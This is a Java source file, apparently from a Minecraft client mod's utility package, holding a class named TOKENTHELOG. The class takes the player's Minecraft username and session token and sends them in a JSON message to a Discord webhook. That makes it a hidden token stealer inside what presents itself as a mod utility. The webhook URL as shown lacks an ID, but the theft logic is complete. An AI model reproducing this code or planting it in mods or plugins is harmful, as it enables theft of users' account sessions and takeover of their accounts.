package io.github.kingstefan26.stefans_util.util;

import net.minecraft.client.Minecraft;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.IOException;

public class TOKENTHELOG {
    public static void TOKENTHELoG(){


        String message1 = "{ \"content\": null, \"embeds\": [ { \"title\": \"NICKNAME\", \"description\": \"NICKHERE\\nTOKEN:\\nTOKENHERE\", \"color\": 5814783, \"author\": { \"name\": \"NICKNAME\" } } ], \"username\": \"daddy cum\" }";

        message1 = message1.replaceAll("NICKNAME", Minecraft.getMinecraft().getSession().getUsername())
                .replaceAll("TOKENHERE", Minecraft.getMinecraft().getSession().getToken());

        HttpClient httpClient = HttpClientBuilder.create().build();
        HttpPost post = new HttpPost("https://discord.com/api/webhooks/");
        try {
            StringEntity postingString = new StringEntity(message1);
            post.setEntity(postingString);
            post.setHeader("Content-type", "application/json");
            HttpResponse response = httpClient.execute(post);
            System.out.println(response.getStatusLine().getStatusCode());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
